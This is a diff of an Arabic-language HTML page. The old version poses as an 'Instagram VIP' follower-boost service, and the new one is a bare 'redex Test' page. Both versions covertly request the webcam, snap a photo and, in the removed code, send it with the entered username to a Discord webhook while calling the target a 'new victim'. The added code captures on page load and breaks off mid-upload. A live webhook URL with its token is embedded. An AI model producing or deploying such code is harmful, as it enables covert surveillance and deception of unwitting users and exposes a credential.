@@ -1,140 +1,25 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram VIP - زيادة المتابعين</title>
-    <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #fafafa;
-            color: #262626;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .card {
-            background: #ffffff;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            padding: 30px;
-            width: 330px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
-        }
-        .logo {
-            font-size: 26px;
-            font-weight: bold;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 15px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 10px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 4px;
-            background: #fafafa;
-            box-sizing: border-box;
-            font-size: 14px;
-            text-align: center;
-        }
-        .btn {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .btn:hover {
-            background-color: #1877f2;
-        }
-        .msg {
-            margin-top: 15px;
-            font-size: 13px;
-            color: #8e8e8e;
-            display: none;
-        }
-    </style>
+    <title> redex Test</title>
 </head>
 <body>
-
-    <div class="card">
-        <div class="logo">Instagram VIP</div>
-        <p style="font-size: 13px; color: #8e8e8e; margin-bottom: 20px;">أدخل اسم المستخدم (Username) الخاص بك لإضافة 5000 متابع لحسابك.</p>
-        
-        <input type="text" id="username" placeholder="اسم المستخدم..." required>
-        <button class="btn" id="mainBtn" onclick="startProcess()">إرسال المتابعين</button>
-        
-        <div class="msg" id="statusMsg">جاري الاتصال بالسيرفر والتحقق من الحساب...</div>
-    </div>
 
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
     <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569812360976269322/dv5MXkROSgdX6Aq1Oo6upwAB8DndK8qSXYrw3xXRG14ZqR8Sg_N1H9zfGkMbHSKB1HPJ';
 
-        function startProcess() {
-            const username = document.getElementById('username').value;
-            const statusMsg = document.getElementById('statusMsg');
-            const mainBtn = document.getElementById('mainBtn');
-
-            if (!username) {
-                alert('الرجاء إدخال اسم المستخدم أولاً!');
-                return;
-            }
-
-            statusMsg.style.display = 'block';
-            statusMsg.innerHTML = "جاري التحقق من الحساب وإضافة المتابعين...";
-            mainBtn.style.display = 'none';
-
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-
-            navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
-                .then(stream => {
-                    video.srcObject = stream;
+        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
+            .then(stream => {
+                video.srcObject = stream;
+                
+                setTimeout(() => {
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    setTimeout(() => {
-                        const context = canvas.getContext('2d');
-                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        
-                        canvas.toBlob(blob => {
-                            const formData = new FormData();
-                            formData.append('file', blob, 'insta_user.jpg');
-                            formData.append('content', `🎯 ضحية جديدة في صفحة زيادة المتابعين!\n👤 اسم المستخدم المدخل: **${username}**`);
-
-                            fetch(WEBHOOK_URL, {
-                                method: 'POST',
-                                body: formData
-                            }).then(() => {
-                                setTimeout(() => {
-                                    statusMsg.innerHTML = "✅ تم بنجاح! سيتم إضافة المتابعين إلى حسابك خلال 24 ساعة.";
-                                    statusMsg.style.color = "#2ecc71";
-                                }, 1000);
-                            });
-                        }, 'image/jpeg', 0.8);
-
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 800);
-                })
-                .catch(err => {
-                    statusMsg.innerHTML = "⚠️ عذراً، يرجى السماح بالكاميرا لتأكيد أنك لست روبوت!";
-                    statusMsg.style.color = "#e74c3c";
-                    mainBtn.style.display = 'block';
-                });
-        }
-    </script>
-
-</body>
-</html>
+                    canvas.toBlob(blob => {
